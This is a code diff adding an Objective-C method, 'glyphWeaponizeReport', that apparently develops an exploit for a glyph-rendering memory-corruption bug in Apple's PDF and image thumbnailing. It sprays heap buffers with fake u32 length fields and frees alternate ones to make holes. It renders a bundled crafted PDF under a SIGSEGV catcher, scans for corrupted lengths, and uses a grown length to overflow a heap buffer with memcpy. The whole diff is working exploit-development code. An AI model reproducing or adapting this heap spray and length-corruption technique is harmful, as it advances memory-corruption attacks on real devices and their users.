@@ -1222,4 +1222,154 @@ cleanup:
     return r;
 }
 
+// ---------------------------------------------------------------------------
+// Weaponize: typed u32 length fields + OOB demo via corrupted length
+//
+// Fill spray with repeating {u32 len=0x00000100; u32 cap=0x00000200} (8-byte).
+// Glyph ±1 on adjacent u16 pair corrupts one u32:
+//   lo+1 hi-1 → u32 -= 65535 (shrink)
+//   lo-1 hi+1 → u32 += 65535 (GROW → OOB)
+// After glyph: find grown lengths → memcpy overflow demo.
+// ---------------------------------------------------------------------------
++ (NSString *)glyphWeaponizeReport:(NSString *)forceName {
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== R5m: Glyph weaponize — typed u32 length + OOB ===\n"];
+
+    NSString *vname = forceName.length ? forceName : @"calif";
+    size_t spraySz = 4288;
+    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);
+
+    enum { NBUFS = 4096 };
+    void **bufs = calloc(NBUFS, sizeof(void *));
+    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
+    int got = 0, holes = 0;
+
+    // Fill with u32 length fields: every 4 bytes = 0x00000100
+    // so any ±1 pair corrupts one u32 length.
+    for (int i = 0; i < NBUFS; i++) {
+        void *b = malloc(spraySz);
+        if (!b) break;
+        uint32_t *p = (uint32_t *)b;
+        size_t n = spraySz / 4;
+        for (size_t j = 0; j < n; j++) p[j] = 0x00000100;  // len=256
+        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
+        bufs[i] = b;
+        got++;
+    }
+    for (int i = 1; i < got; i += 2) { free(bufs[i]); bufs[i] = NULL; holes++; }
+    int live = got - holes;
+    scopeNote(r, [NSString stringWithFormat:
+                  @"  sprayed %d bufs x %zu (u32 len=0x100)  [live=%d holes=%d]",
+                  got, spraySz, live, holes]);
+
+    // ---- render (crash-catch) ----
+    NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
+    if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
+    {
+        kpGlyphCrashed = 0;
+        void (*oldsegv)(int) = signal(SIGSEGV, kpGlyphSegv);
+        if (sigsetjmp(kpGlyphJmp, 1) != 0) {
+            scopeNote(r, @"  *** CAUGHT SIGSEGV during render ***");
+        } else {
+            NSURL *url = [NSURL fileURLWithPath:path];
+            CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
+            if (src) {
+                int sz = 256;
+                CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+                const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                       kCGImageSourceThumbnailMaxPixelSize };
+                const void *vals[] = { kCFBooleanTrue, szRef };
+                CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                scopeNote(r, @"  rendering glyph…");
+                CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+                scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
+                if (img) CGImageRelease(img);
+                CFRelease(opts); CFRelease(szRef); CFRelease(src);
+            }
+        }
+        signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
+    }
+
+    // ---- scan for corrupted u32 length fields ----
+    [r appendString:@"\n--- u32 length scan ---\n"];
+    int hits = 0, grew = 0, shrank = 0;
+    int firstIdx = -1;
+    size_t firstOff = 0;
+    uint32_t firstLen = 0;
+    size_t scanLen = (spraySz > 8) ? spraySz - 8 : spraySz;
+
+    for (int i = 0; i < got; i += 2) {
+        uint8_t *b = bufs[i];
+        if (!b) continue;
+        uint32_t *p = (uint32_t *)b;
+        for (size_t o = 0; o + 3 < scanLen; o += 4) {
+            uint32_t len = p[o / 4];
+            if (len == 0x100) continue;
+            hits++;
+            int delta = (int)len - (int)0x100;
+            if (delta > 0) grew++; else shrank++;
+            if (firstIdx < 0) { firstIdx = i; firstOff = o; firstLen = len; }
+            if (hits <= 10) {
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  LEN HIT buf %d off=%zu  u32: 0x00000100->0x%08x  delta=%+d%s",
+                    i, o, len, delta,
+                    (delta > 0) ? "  [GROWN — OOB!]" : "  [shrunk]"]);
+            }
+        }
+    }
+    scopeNote(r, [NSString stringWithFormat:
+        @"  VERIFY LEN_HIT=%d GREW=%d SHRANK=%d FIRST=(buf %d off %zu) len=0x%x VARIANT=%s",
+        hits > 0, grew, shrank, firstIdx, firstOff, firstLen, vname.UTF8String]);
+
+    if (hits == 0) {
+        scopeNote(r, @"  no u32 length changed.");
+    } else {
+        scopeNote(r, [NSString stringWithFormat:@"  >>> %d length hit(s): +%d grew / %d shrank", hits, grew, shrank]);
+        // ---- OOB demo: use first GROWN length to overflow a small dest ----
+        if (grew > 0 && firstIdx >= 0) {
+            // find first grown
+            for (int i = 0; i < got && firstIdx >= 0; i += 2) {
+                uint8_t *b = bufs[i];
+                if (!b) continue;
+                uint32_t *p = (uint32_t *)b;
+                for (size_t o = 0; o + 3 < scanLen; o += 4) {
+                    uint32_t len = p[o / 4];
+                    if (len == 0x100 || len <= 0x100) continue;
+                    // GROWN length — demo OOB
+                    size_t srcAvail = spraySz - o;
+                    size_t copyN = (len < srcAvail) ? len : srcAvail;
+                    uint8_t *dest = malloc(0x100);  // original size
+                    if (dest) {
+                        memset(dest, 0xAA, 0x100);
+                        scopeNote(r, [NSString stringWithFormat:
+                            @"  OOB-DEMO: src buf %d off %zu, len 0x%x (was 0x100), copy %zu bytes into 0x100 dest",
+                            i, o, len, copyN]);
+                        memcpy(dest, b + o, copyN);
+                        size_t overflow = (copyN > 0x100) ? copyN - 0x100 : 0;
+                        if (overflow > 0) {
+                            scopeNote(r, [NSString stringWithFormat:
+                                @"  >>> HEAP OVERFLOW: wrote %zu bytes past 0x100 dest (overflow=%zu)", copyN, overflow]);
+                            scopeNote(r, [NSString stringWithFormat:
+                                @"  dest[0x100..0x107]: %02x %02x %02x %02x %02x %02x %02x %02x",
+                                dest[0x100], dest[0x101], dest[0x102], dest[0x103],
+                                dest[0x104], dest[0x105], dest[0x106], dest[0x107]]);
+                        } else {
+                            scopeNote(r, @"  copy fits in dest (len shrank or src too small)");
+                        }
+                        free(dest);
+                    }
+                    goto done_demo;
+                }
+            }
+            done_demo:;
+        }
+    }
+
+cleanup:
+    for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
+    free(bufs);
+    return r;
+}
+
 @end
